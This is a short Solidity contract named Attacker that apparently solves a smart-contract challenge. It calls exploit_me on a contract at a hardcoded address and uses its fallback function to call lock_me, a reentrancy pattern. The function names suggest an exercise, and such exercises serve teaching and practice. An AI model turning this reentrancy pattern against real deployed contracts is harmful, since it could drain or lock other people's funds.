// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;


import "./IChallenge.sol";

contract Attacker {
    IChallenge public challenge;

    constructor() {
        challenge = IChallenge(0x43f165eA17a8AB50a1e81b3451AC8b5156C1065e);
    }

    function exploitChallenge() public {
        challenge.exploit_me("Asiwaju");
    }

    fallback() external {
        challenge.lock_me();
    }

}
